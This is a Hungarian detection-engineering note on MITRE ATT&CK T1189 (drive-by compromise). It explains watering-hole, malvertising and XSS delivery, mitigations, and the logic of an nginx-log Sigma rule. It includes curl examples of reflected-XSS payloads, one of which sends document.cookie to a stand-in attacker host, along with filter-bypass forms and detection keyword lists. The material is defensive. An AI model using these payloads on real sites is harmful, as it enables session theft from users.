---
mitre_id: T1189
mitre_type: technique
name: Drive-by Compromise
aliases:
  - T1189
  - Drive-by Compromise
  - Drive-by download
  - Watering hole
url: https://attack.mitre.org/techniques/T1189/
tactic:
  - "[[TA0001 - Initial Access]]"
subtechnique_count: 0
platforms:
  - Windows
  - Linux
  - macOS
  - Identity Provider
de_priority: közepes
coverage: részleges
rules:
  - DETECT-2026-0042
---
# T1189 — Drive-by Compromise

## Lényeg

A támadó nem a szervert támadja, hanem a **felhasználó böngészőjét** — miközben az áldozat teljesen hétköznapi módon, saját szándékából nyit meg egy weboldalt. Az oldal tartalma (vagy annak egy része: egy hirdetés, egy beágyazott szkript, egy felhasználók által feltölthető szöveg) a támadó kezén van, és a betöltéskor automatikusan lefutó kód a böngésző vagy egy plugin sérülékenységét használja ki.

A technika lényege ezért a **bizalmi irány megfordítása** a [[T1190 - Exploit Public-Facing Application]]-hoz képest: ott a támadó küld kérést a szerverhez, itt a *kliens* kéri le a tartalmat, és a rosszindulatú anyag a **válaszban** jön. Ez detekciós szempontból döntő különbség, mert a kihasználás nem a szerver logjában, hanem a végponton történik.

A támadói döntés, ami ezt a technikát megkülönbözteti a phishingtől: itt **nincs csali, amire rá kell venni a felhasználót**. Nem kell rábeszélni semmire, nem kell mellékletet megnyitni — elég, hogy meglátogat egy oldalt, amit amúgy is szokott (ez a *watering hole* változat), vagy amire egy hirdetési hálózat eljuttatja.

> [!quote] MITRE definíció
> Adversaries may gain access to a system through a user visiting a website over the normal course of browsing.

## Mihez vezet

A böngésző folyamatában megszerzett kódfuttatást a támadó tipikusan a [TA0002 - Execution] felé viszi: célja, hogy a böngésző sandboxából kitörve tartós, a böngésző bezárását is túlélő kódfuttatási képességet kapjon a végponton — jellemzően úgy, hogy a böngésző folyamata egy interpretert (`powershell.exe`, `sh`) indít, vagy payloadot ír a lemezre és futtatja.

## Altechnikák

Ennek a technikának az ATT&CK szerint **nincs altechnikája**. A technika viszont több, jól elkülöníthető *szállítási módot* takar — az ATT&CK saját oldala négyet nevez meg —, és ezek eltérő detekciós felületet adnak; ezért ez a jegyzet a szokásos "Altechnikák"/"Összehasonlítás" szekciók helyett a "Hogyan csinálják a gyakorlatban" szakaszban tárgyalja őket, ugyanúgy, ahogy [[T1190 - Exploit Public-Facing Application]] és [[T1040 - Network Sniffing]].

## Hogyan csinálják a gyakorlatban

Itt három szereplő van, és ez a technika megértésének kulcsa — mert a detekciós jel nem ott van, ahol a támadás:

- **A — a támadó.** Ő helyezi el a rosszindulatú tartalmat. Fontos: A a támadás pillanatában **nem kommunikál közvetlenül** az áldozattal.
- **B — a kiszolgáló oldal.** Vagy egy kompromittált legitim weboldal, vagy egy hirdetési hálózat, vagy — és ez a szempontunkból legfontosabb eset — **a szervezet saját, sérülékeny webalkalmazása**, amit A arra használ, hogy a látogatóinak szkriptet szolgáltasson ki.
- **C — az áldozat böngészője.** Itt fut le a kód, és itt történik a tulajdonképpeni kompromittálás.

A MITRE saját oldala a folyamatot négy lépésben írja le: a felhasználó meglátogatja az oldalt, ami a támadó tartalmát szolgálja ki; a szkriptek automatikusan lefutnak, és jellemzően a böngésző és a pluginek verzióját vizsgálják sérülékeny változat után; ha találnak ilyet, az exploit kód eljut a böngészőbe; sikeres kihasználás esetén a támadó kódfuttatást szerez a felhasználó rendszerén.

### Kompromittált legitim oldal vagy hirdetés (watering hole, malvertising)

A támadó a *kiszolgáló* oldalt veszi át — vagy annak egy erőforrását: egy publikusan írható cloud storage bucketből betöltött szkript-fájlt, vagy egy megvásárolt hirdetést egy legitim hirdetési hálózaton keresztül. A rosszindulatú kód innentől a legitim oldal nevében fut, a böngésző same-origin szempontjából is annak látszik.

Ennek a változatnak **a szervezet saját logjaiban nincs nyoma**: a kérés a külső oldalra megy, a válasz a végponton fut le. Ami látható lenne belőle, az mind a végponton van: a böngésző gyanús erőforrás-letöltése, a böngészőből induló váratlan gyermekfolyamat, a temp könyvtárba írt payload. A MITRE analitikái (AN0498–AN0501) mind pontosan erre épülnek.

### Beépített, felhasználó által befolyásolható tartalom — cross-site scripting

A negyedik szállítási mód az, amiben a szervezet saját alkalmazása lesz a kiszolgáló (B), és ezért ez az egyetlen, aminek **van szerveroldali nyoma**. A MITRE megfogalmazásában:

> Built-in web application interfaces that allow user-controllable content are leveraged for the insertion of malicious scripts or iFrames (e.g., cross-site scripting)

A **reflected XSS** esetében a szkript a kérésben utazik: a támadó rábírja az áldozatot egy általa összeállított link megnyitására, a sérülékeny alkalmazás pedig a paraméter tartalmát szűrés nélkül visszaírja a válasz HTML-jébe, ahol az végrehajtódik. Emiatt — és csak emiatt — a payload **átmegy a webszerver access logján**:

```bash
curl -G 'http://target/search' --data-urlencode "q=<script>alert(1)</script>"
curl -G 'http://target/search' --data-urlencode "q=<img src=x onerror=alert(1)>"
curl -G 'http://target/search' --data-urlencode "q=<svg onload=fetch('http://attacker/?c='+document.cookie)>"
curl -G 'http://target/page' --data-urlencode "next=javascript:alert(1)"
```

A gyakorlatban használt alakok a szűrő-megkerülés körül forognak: ha a `<script>` tiltott, akkor esemény-kezelő attribútum egy ártalmatlan tagon (`onerror=`, `onload=`, `onmouseover=`); ha a `<` kódolva van, akkor HTML-entitás (`&lt;script`, `&#60;script`); ha az attribútum-kontextusból kell kitörni, akkor idézőjel + `>` + új tag; a payload elrejtésére pedig `eval(atob('...'))` és `String.fromCharCode(...)`. A `document.cookie` és a `window.location` jelenléte az, ami megmutatja, mi a payload célja: session-lopás vagy átirányítás.

A **stored (persistent) XSS** ugyanaz a hiba, de a szkript az alkalmazás adatbázisába kerül be, és utána *minden* látogatónak kiszolgálódik. Ez a változat a T1189 definíciójához a legközelebbi eset — igazi watering hole a szervezet saját oldalán —, viszont **az access logból sokkal rosszabbul látszik**: a beviteli kérés jellemzően POST (nincs body a logban), a kiszolgálás pedig utána már teljesen normális GET-eknek tűnik.

**Mi váltja ki a gyakorlatban:** a felhasználó oldalán semmilyen szokatlan cselekvés — ez a technika definiáló tulajdonsága. Ami a *jelet* kiváltja jóindulatúan: egy oldal, ami legitim módon HTML- vagy JavaScript-szöveget fogad egy paraméterben — egy kód-megosztó, egy rich-text előnézet, egy "oszd meg ezt a részletet" funkció. Ilyenkor a payload-szerű tartalom a kérésben *az alkalmazás rendeltetése szerint* van ott.

## Mitigáció

A MITRE mitigációi közül **kettő van érdemi kihatással a szabály hatókörére**:

- **Böngésző-sandbox és exploit-védelem (M1048, M1050).** A böngészők sandboxa és a Windows exploit-mitigációi (Exploit Guard, CFG) a technika *kimenetét* akadályozzák meg, a kísérletet nem: a rosszindulatú szkript ugyanúgy lefut a böngészőben, a sandboxból kitörés hiúsul meg. Ez pontosan hatókör-információ: a szerveroldali XSS-szabály **nem tud különbséget tenni** a sikeres és a meghiúsult kihasználás között, mert a kérés mindkét esetben azonos.
- **Böngésző és plugin frissítése (M1051).** A drive-by-család gyakorlatilag mindig *ismert* böngésző-/plugin-sérülékenységet céloz, ezért a naprakész böngésző a technika legerősebb egyedi kontrollja. **De ez az XSS-ágra nem érvényes:** a reflected XSS nem a böngésző hibája, hanem az alkalmazásé — egy teljesen naprakész böngésző is végrehajtja a szkriptet, amit a szerver a saját oldalába beleírt. Ez az oka, hogy ezen az ágon a szerveroldali detekció önálló értékkel bír, míg a klasszikus böngésző-exploit ágon nem.
- **Tartalomszűrés (M1021 Restrict Web-Based Content).** Ad- és szkript-blokkoló kiterjesztés, illetve alkalmazásszinten Content Security Policy. A CSP érdemi hatása a detekcióra az, hogy egy jól beállított CSP mellett az inline szkript nem hajtódik végre — vagyis a szabály találata *még inkább* csak kísérletet jelöl.

Amit **nem** lehet ezzel a technikával szemben megtenni, és ezért a detekció itt az egyetlen válasz: a felhasználót nem lehet "kiképezni" ellene. Nincs mit felismernie — nem kattintott mellékletre, nem adott meg jelszót, csak megnyitott egy oldalt. A MITRE M1017 (User Training) mitigációja ezért ezen a technikán érdemben gyengébb, mint a phishing-családon.

## Detekciós stratégia

### Szükséges telemetria

| Adatforrás | Típus | Megjegyzés |
| ---------- | ----- | ---------- |
| nginx access log (`access_combined`) | Web / Network Traffic | `uri_path` + `uri_query`. **Csak a reflected-XSS ágat látja**, és csak a GET-ben szállított payloadot. A repo egyetlen adatforrása erre a technikára |
| Végponti folyamat-telemetria (Sysmon EID 1) | Process | A böngésző (`chrome.exe`, `msedge.exe`) váratlan gyermekfolyamata — a MITRE saját analitikáinak elsődleges jele. **Nincs szabály erre ebben a repóban**, bár az adatforrás létezik |
| Végponti fájlírás (Sysmon EID 11) | File | A böngésző által temp könyvtárba írt payload, gyors staging-minta. Adatforrás elvileg van, szabály nincs |
| Proxy / DNS log | Network Traffic | A ténylegesen meglátogatott külső oldal; a watering-hole/malvertising ág **egyetlen lehetséges** hálózati jele. Nincs betöltve |
| Böngésző-telemetria (kiterjesztés, EDR) | Application | A gyanús erőforrás-lekérés, szkript-injektálás. Nincs |

### Detekciós logika

A legfontosabb dolog, amit erről a technikáról tudni kell: **a rendelkezésre álló adatforrás és a technika súlypontja nem esik egybe.** A T1189 fő formája (kompromittált külső oldal, malvertising) a végponton és a proxy-logban látszik — ebből a repóban egyik sem áll rendelkezésre. Ami rendelkezésre áll, az a saját webszerver access logja, ami a technikának **egyetlen szállítási módját** látja: a reflected XSS-t, amikor a szkript a saját alkalmazás kérésében utazik.

- **Kilenc payload-alak, kategóriánként.** A szkript-tag és annak kódolt/entitásos alakjai; esemény-kezelő attribútum (`onerror=`, `onload=`, …); `javascript:` URI-séma; veszélyes HTML-tagek (`<img`, `<svg`, `<iframe`, `<video`, …); DOM-exfil hivatkozások (`document.cookie`, `window.location`); JS-végrehajtó/obfuszkáló hívások (`eval(`, `atob(`, `String.fromCharCode(`); PoC-függvények (`alert(`, `confirm(`, `prompt(`); attribútum-/tag-kitörés (idézőjel → `>` → `<`); HTML-entitással kódolt szkript-tag. A kategóriák darabolása nem kozmetika: ez az, ami a találatot triage-elhetővé teszi (egy `document.cookie` payload session-lopás, egy `alert(1)` puszta próbálkozás).
- **Két szükséges FP-kapu.** A veszélyes-tag minta megköveteli, hogy a nyitó `<` (vagy `%3c`) **közvetlenül a tagnév előtt** álljon — különben a "video", "input", "body" szavak bármilyen szövegben elsülnének. A JS-végrehajtó és PoC-függvény minták megkövetelik a **nyitó zárójelet** — így az `alert`, `prompt` szavak önmagukban nem elegendőek. E két kapu nélkül ez a szabály használhatatlanul zajos lenne.
- **A `404`-en kívül semmit nem szűrünk.** Ez a repo-szabály és a SigmaHQ megfelelője között egyező döntés, és a `uri_path`-ág miatt szükséges: egy rosszul formált payloadot az **nginx maga utasít el `400`-cal**, tehát a `200`-ra szűkítés pont a legjellemzőbb kimenetet dobná el. A `403` (WAF blokkolt) és a `302` (átirányítás) ugyanígy értékes marad — ezeket a scannerek rutinszerűen begyűjtik.
- **Tudatosan nem detektáljuk:** a POST-bodyban szállított XSS-t (nincs body a logban) és a **DOM-alapú XSS**-t — utóbbi kizárólag kliensoldalon zajlik, a payload jellemzően a URL fragmentjében (`#`) van, amit a böngésző **el sem küld a szervernek**. Ez utóbbi a modern SPA-kon (React/Vue/Angular) a domináns XSS-forma, tehát a vakfolt nem marginális.

### False positive források

- **Saját és idegen scanner-forgalom.** Egy XSStrike/dalfox/Burp/ASV-futás definíció szerint ezeket a payloadokat küldi. Nincs allowlist a szabályban — egy host- vagy IP-alapú kivétel a valódi próbálkozást is elrejtené; a triage a scan-naptárral veti össze.
- **Legitim HTML/JS-tartalmat fogadó paraméter.** Rich-text előnézet, kód-megosztó, "oszd meg ezt a részletet" funkció, `<video>`/`<iframe>` markup-ot fogadó beágyazási felület. Ez az egyetlen igazi alkalmazás-vezérelt FP-osztály, és per-alkalmazás dönthető el.
- **Volumen, nem hamis pozitív.** Ugyanaz, mint [[T1190 - Exploit Public-Facing Application]]-nál: az XSS-próbálkozás folyamatos háttérzaj minden internetre kitett hoston. Aktivitás-jel, nem azonnali incidens-trigger — ez indokolja a `medium` szintet is, szemben az SQLi- és Log4Shell-szabály `high` szintjével.

## Kapcsolódó szabályok

| detect_id | Szabály | Telemetria | Szint | Miért szükséges |
| --------- | ------- | ---------- | ----- | --------------- |
| [DETECT-2026-0042](https://github.com/martonbence/Detection-Engineering/blob/main/rules/sigma/DETECT-2026-0042_Web-Server-Cross-Site-Scripting-Attempt-in-Request-Path-or-Query.yml) | Web Server Cross-Site Scripting Attempt in Request Path or Query | nginx access log (`access_combined`), `uri_path` + `uri_query` | medium | Az alkalmazás a kérésből vett, felhasználó által kontrollált tartalmat kontextus-helyes kódolás nélkül írja vissza a válasz HTML-jébe, így a támadó szkriptje a legitim oldal origin-jében fut le az áldozat böngészőjében. Ezzel megszerezheti a session cookie-t, művelethez kényszerítheti a felhasználó nevében az alkalmazást, vagy — a T1189 klasszikus céljának megfelelően — exploit kódot szállíthat a böngészőnek. Az áldozatnak ehhez csak meg kell nyitnia egy linket, hitelesítő adatot nem kell megadnia. |

A tag-választás itt tudatos és nem triviális: ez az **egyetlen** a repo hét web-szabálya közül, ami `attack.t1189`-et visel, míg a szomszédai (0037 traversal, 0041 SQLi, 0043 Log4Shell) `attack.t1190`-et. A határvonal az, hogy **kinek a szoftvere sérül**: a T1190 a szerveroldali alkalmazást használja ki, a T1189 a kliens végpontját a lap meglátogatásakor. A reflected XSS a kliens oldalára esik — ugyanezt a szétválasztást teszi a SigmaHQ is a saját két szabályában (`web_xss_in_access_logs.yml` → `attack.t1189`, `web_sql_injection_in_access_logs.yml` → `attack.t1190`).

## Kapcsolódó jegyzetek

- **Rokon technikák:** [[T1190 - Exploit Public-Facing Application]] — ugyanaz az adatforrás és ugyanaz a request-alapú payload-szállítás, a különbség a kihasznált szoftver oldala (szerver vs. kliens); ez a két jegyzet együtt olvasva adja meg a web-szabályok tag-döntési szabályát. [[T1566 - Phishing]] — a másik nagy kliens-oldali belépési út, azzal a döntő különbséggel, hogy ott a felhasználónak tennie kell valamit (megnyitni, megadni), itt nem
- **MITRE:** https://attack.mitre.org/techniques/T1189/

## Saját feljegyzések

